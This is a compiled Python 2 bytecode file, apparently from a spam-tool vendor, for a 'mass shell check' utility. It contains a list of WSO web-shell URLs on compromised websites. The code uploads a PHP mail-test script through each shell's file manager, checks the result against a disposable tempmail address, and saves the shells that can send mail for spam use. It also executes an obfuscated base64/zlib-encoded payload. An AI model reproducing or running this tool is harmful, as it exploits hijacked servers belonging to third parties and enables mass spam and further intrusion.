ó
O^c           @   s,  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z d  d l Te   d Z d Z d Z d Z d Z d	 Z d
 Z e e e GHd Z y e j d  Wn n Xd   Z d Z e j  e j! e   d Ud   Z" e d k r}e   n« e d k r(y e# e d e  Z$ y. e% e$ d   Z& e& j'   j(   Z' Wd QXWn e) k
 rįn Xe* e'  Z' y" e d  Z+ e+ j, e" e'  Z- Wn n XWq(q(Xn  d S(   i’’’’N(   t   Pool(   t   system(   t   *s   V1.3-2s   [31ms   [32ms   [33ms   [37ms’  
====================================================================
----------------------------- XSPAM TOOLS --------------------
------------ More Tools: https://xspamtools.me ---------------
====================================================================
 __       __   ______    ______    ______  
/  \     /  | /      \  /      \  /      \ 
$$  \   /$$ |/$$$$$$  |/$$$$$$  |/$$$$$$  |
$$$  \ /$$$ |$$ \__$$/ $$ |  $$/ $$ \__$$/ 
$$$$  /$$$$ |$$      \ $$ |      $$      \ 
$$ $$ $$/$$ | $$$$$$  |$$ |   __  $$$$$$  |
$$ |$$$/ $$ |/  \__$$ |$$ \__/  |/  \__$$ |
$$ | $/  $$ |$$    $$/ $$    $$/ $$    $$/ 
$$/      $$/  $$$$$$/   $$$$$$/   $$$$$$/  
                                                                                                                                 
MASS SHELL CHECK SEND 
IT WILL GIVE SHELL LIST SUPPORTING SEND FUNCTION
Note: SHELL SUPPORT SEND FUNCTION  WILL BE STORED IN RESULT                              

====================================================================
i   t   resultsc          C   s   d }  t  |  t GHd  S(   Ns#  
Rules: must use wso shell this one --> https://pastebin.com/Ds35ij44


1. Mass shell to anything uploader! 
	Put shell list like this
		http://toprose24.ru/wp-includes/js/tinymce/wso.php
		http://nacso.org/wp-admin/shop/media/wso.php
		http://www.systemawindsor.com/2014/wso.php
		http://heights.co.kr/wp-includes/js/tinymce/wso.php
		http://mybaguse.com/oldsite/wp-includes/wso.php
		http://bdsharebazar.info/wp-includes/Core/wso.php
		http://www.modsolar.net/wp-content/uploads/wso.php
		http://theknittingneedle.in//wp-includes/css/wso.php



(   t   yellowt   white(   t   gd(    (    s   massshell15.pyt   guide>   s    st   eNpLSU1TyMlMTs0rTtUoLinKzEvXtOLlAgkp2CoUpRaWphaXFOulp5ZoKGWUlBQUW+nrV5Tk5+cU6+Wm6hcnlqUW6ackliTag5i2SgraClBDAE5FHno=c         C   s  yt  j   } | j d  } t j d | j  } | d } d | d } t  j |  d d } d } | j d	 k rūd
 | j k rūt d |   t j d | j  } | d } t j d | j  } | d } t j d | j  }	 |	 d }	 t j d | j  }
 |
 d }
 i | | f d 6} i | d 6| | 6|	 d 6|
 d 6} t  j	 |  d | d | d d } | j d	 k rćd
 | j k rć|  j
 d  } | t |  d } |  j | |  } t  j |  } d | j k rĖt d |  d t GHd  } d } xb | d  k rZ| j d  } t j d | j  } | r8| } n  | d 7} | d k rłg  } qłqłW| g  k rt d |  d t GHqąt d |  d t GHt j d  t d  d  j |  d!  t j d"  qųt d# |  d$ t GHqt d# |  d% t GHn t d# |  d& t GHWn n Xd  S('   Ns   https://tempmail.nets+   class="adres-input" value="(.*?)" readonly>i    s7   
			<?php
				if(function_exists("mail")) {
					mail('sY   ', '3xBeast', 'Mail Working!');
					echo '1';
				} else {
					echo '0';
				}
			?>
		t   timeouti
   s   mailcheck-icq-744324366.phpiČ   s   File managers	   shell -> s(   <input type=hidden name=a value='(.*?)'>s(   <input type=hidden name=c value='(.*?)'>s)   <input type=hidden name=p1 value='(.*?)'>s.   <input type=hidden name=charset value='(.*?)'>t   ft   at   p1t   charsett   filest   datat   /i   t   1s   [+] s    ==> Trying if mail works!s"   <li class="mail " id="mail_(.*?)">id   s,    ==> Mail doesn't works or too late to wait!s    ==> Mail working fine!R   s   mail_works.txts   
s   ..s   [-] s*    ==> Mail function disabled! Why checking?s    ==> Upload failed!s    ==> Shell not working!(   t   requestst   sessiont   gett   ret   findallt   contentt   status_codet   textt   licenset   postt   splitt   lent   replaceR   R   t   Nonet   redt   greent   ost   chdirt   opent   write(   t   urlt
   getSessiont   sessionMailt   workMailt
   scriptmainR   t	   nameshellt   filesmant   getcR   R   t   fileR   t   reqt   ggt   removet   finalt   senditt   maincodeurlt   countt
   getcodeurlt   sexy(    (    s   massshell15.pyt   tool15T   sd    




"!	
i    s   [?] Enter wso shells list: t   ri
   (.   R   t   sysR!   R   t   randomt   urllib2t   urllibt   httplibt   sockett   sslt   stringt   base64t   zlibt   multiprocessingR    t   multiprocessing.dummyt
   ThreadPoolt   platformR   t   coloramat   initt   currentVersionR   R    t   blueR   R   t   combot   choicet   mkdirR   t   singlelicenset
   decompresst	   b64decodeR7   t	   raw_inputt	   listshellR#   R   t   readt
   splitlinest   IOErrort   listt   ppt   mapt   pr(    (    (    s   massshell15.pyt   <module>   sh   
		F
